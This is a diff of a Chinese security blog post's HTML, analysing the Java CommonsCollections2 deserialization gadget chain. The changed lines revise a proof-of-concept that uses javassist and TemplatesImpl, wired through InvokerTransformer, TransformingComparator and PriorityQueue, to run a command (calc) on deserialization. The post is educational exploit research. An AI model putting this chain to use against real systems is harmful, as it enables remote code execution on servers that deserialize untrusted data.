@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161936710.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png">
 <meta property="article:published_time" content="2021-12-06T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-08T08:41:31.637Z">
+<meta property="article:modified_time" content="2021-12-08T09:47:45.704Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
@@ -694,7 +694,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-08 16:41:31'>2021-12-06 22:00</time>
+            Created At : <time class="date" title='Updated At: 2021-12-08 17:47:45'>2021-12-06 22:00</time>
         
     </div>
     <div class="article-meta">
@@ -729,7 +729,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections2%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ClassLoader-defineClass"><span class="toc-text">0x04 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x05 利用链分析（命令执行）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9POC%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%A7%A3%E9%87%8A"><span class="toc-text">对POC的一些代码进行解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x06 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%EF%BC%9A"><span class="toc-text">完整的代码执行POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-POC%E8%B0%83%E8%AF%95"><span class="toc-text">0x07 POC调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x08 疑问解答记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections2%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ClassLoader-defineClass"><span class="toc-text">0x04 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x05 利用链分析（命令执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x06 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%EF%BC%9A"><span class="toc-text">完整的代码执行POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-POC%E8%B0%83%E8%AF%95"><span class="toc-text">0x07 POC调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x08 疑问解答记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -888,7 +888,8 @@
 &#125;
 </code></pre>
 <p>这里的ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p>
-<h2 id="0x05-利用链分析（命令执行）："><a href="#0x05-利用链分析（命令执行）：" class="headerlink" title="0x05 利用链分析（命令执行）："></a>0x05 利用链分析（命令执行）：</h2><p>第一步：TransformingComparator#compare方法</p>
+<h2 id="0x05-利用链分析（命令执行）："><a href="#0x05-利用链分析（命令执行）：" class="headerlink" title="0x05 利用链分析（命令执行）："></a>0x05 利用链分析（命令执行）：</h2><p>这条链不是CC2，是利用CC2的前半条链+CC1的后半条链。实现命令执行，但是无法造成代码执行（CC2引入了javassist可以动态生成代码块，所以可以造成代码执行）。如果想直接学CC2，可以看下一节。</p>
+<p>第一步：TransformingComparator#compare方法</p>
 <p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png" alt="image-20211207095605754"></p>
 <p>可以看到obj1是形参，这个是可控的，然后我们要判断this.transformer是否也是可控的，可以全局搜一下</p>
@@ -961,8 +962,9 @@ public class cc2Test &#123;
 &#125;
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207101514337.png" alt="image-20211207101514337"></p>
-<h3 id="对POC的一些代码进行解释"><a href="#对POC的一些代码进行解释" class="headerlink" title="对POC的一些代码进行解释"></a>对POC的一些代码进行解释</h3><p>第一个方框是CC1中后半条链，用于触发pyload</p>
-<p>第二个方框是TransformingComparator.</p>
+<p>对POC的一些代码进行解释</p>
+<p>第一个方框是CC1中后半条链，用于触发pyload</p>
+<p>第二个方框是TransformingComparator</p>
 <p>第三个方框：</p>
 <p>queue.add两次，如果我们只添加一个的话，最终结果会为-1从而无法进入siftDown函数</p>
 <pre><code>private void heapify() &#123;
@@ -970,7 +972,6 @@ public class cc2Test &#123;
         siftDown(i, (E) queue[i]);
 &#125;
 </code></pre>
-<p>到这里其实我们发现cc2中使用的是javasist 和 TemplatesImpl，利用字节码来进行执行代码的，因为我们上的POC只能执行命令，无法造成代码执行，所以下面我们分析下第二种利用方式</p>
 <h2 id="0x06-利用链分析（代码执行）："><a href="#0x06-利用链分析（代码执行）：" class="headerlink" title="0x06 利用链分析（代码执行）："></a>0x06 利用链分析（代码执行）：</h2><p>这里才是真正的CC2，能够进行RCE。</p>
 <p>我们先分析后半条链，也就是如何触发RCE的。然后在拼接前半条链，我个人喜欢逆向先知道如何触发RCE，再找入口去调用后半条链。</p>
 <p>第一步：首先我们使用javassist，生成静态代码块，注意：静态代码块会在创建类实例的时候执行。</p>
@@ -1013,8 +1014,11 @@ public class test2 &#123;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.PriorityQueue;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.collections4.comparators.TransformingComparator;
@@ -1026,17 +1030,16 @@ public class cc2 &#123;
         String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
         String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
 
-        //创建动态一个类，设置父类添加命令执行内容
+        //动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
         ClassPool classPool=ClassPool.getDefault();//返回默认的类池
         classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
-        CtClass payload=classPool.makeClass(&quot;CommonsCollections22222222222&quot;);//创建一个新的public类
+        CtClass payload=classPool.makeClass(&quot;cmd&quot;);//创建一个新的public类
         payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
-        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); // 创建 static 代码块，并插入代码
+        byte[] bytes=payload.toBytecode();//将动态代码块转换字节码赋予给byte数组
 
-        byte[] bytes=payload.toBytecode();//转换为byte数组
-
-        //反射获取_bytecodes的值，设置为转换后的payload的字节码。_name也是一样的方式设置为test
-        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();//反射创建TemplatesImpl
+        //反射获取_bytecodes的值，设置为转换后的静态代码块的字节码。_name也是一样的方式设置为test
+        Object templatesImpl= TemplatesImpl.class.newInstance();//反射创建TemplatesImpl实例，也就是获得一个对象
         Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段
         field.setAccessible(true);//暴力反射
         field.set(templatesImpl,new byte[][]&#123;bytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
@@ -1044,12 +1047,11 @@ public class cc2 &#123;
         field1.setAccessible(true);//暴力反射
         field1.set(templatesImpl,&quot;test&quot;);//将templatesImpl上的_name字段设置为test
 
-        
         InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
         TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
         PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
-        queue.add(1);//添加数字1插入此优先级队列
-        queue.add(1);//添加数字1插入此优先级队列
+        queue.add(1);//添加数字1插入此优先级队列，这里的数字随便填，只是起到占位作用
+        queue.add(2);//
 
         Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);//获取PriorityQueue的comparator字段
         field2.setAccessible(true);//暴力反射
@@ -1160,7 +1162,7 @@ queue.add(2);
     <p><span class="copy-title">Count:</span><span class="post-count">3.8k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-08, 16:41:31</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-08, 17:47:45</p>
     <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections2分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
